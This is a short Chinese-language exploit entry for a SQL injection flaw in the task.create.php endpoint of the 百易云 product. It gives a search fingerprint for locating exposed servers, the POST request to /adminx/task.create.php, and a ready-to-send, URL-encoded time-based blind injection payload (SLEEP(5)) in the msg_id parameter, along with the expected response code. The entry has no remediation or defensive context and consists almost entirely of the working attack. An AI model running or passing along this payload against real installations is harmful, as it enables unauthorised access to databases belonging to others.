# 百易云task.create.php存在SQL注入漏洞

百易云task. ｜ SQL注入 ｜ —
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`POST /adminx/task.create.php HTTP/1.1`

**Payload**
```
msg_id=1%20OR%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))xxxx)&org_id=
```
- **响应特征**：200